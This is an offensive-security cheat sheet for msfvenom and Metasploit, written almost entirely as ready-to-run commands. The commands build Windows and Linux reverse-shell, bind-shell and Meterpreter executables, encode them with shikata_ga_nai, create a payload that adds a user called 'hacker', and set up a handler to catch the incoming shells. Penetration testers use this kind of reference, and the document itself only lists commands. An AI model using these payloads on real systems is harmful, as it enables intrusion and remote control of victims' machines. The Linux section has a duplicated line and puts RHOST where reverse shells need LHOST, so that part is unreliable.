# MSFVenom

## List Payloads

```bash
#Linux
msfvenom --list payloads --platform linux --arch x86
#Windows
msfvenom --list payloads --platform windows --arch x64
```

## Windows Payloads

### Metasploit Meterpreter Listener

```bash
msf> use exploit/multi/handler  
msf> set payload windows/meterpreter/reverse_tcp  
msf> set lhost <IP>  
msf> set lport <PORT>  
msf> set ExitOnSession false  
msf> run
```

### x86

```bash
## Non Staged
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

## Staged
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

## Meterpreter encoded
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```

### x64

```bash
## Non Staged
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.X.X LPORT=8082 -f exe -o shell.exe

## Staged Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	
msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe	

## Add a user in windows with msfvenom: 
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

### Encode and remove bad chars

```bash
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
```

## Linux Payloads

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf	
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
```

[Web Payloads](MSFVenom%20ff30b/Web%20Payloa%20c6851.md)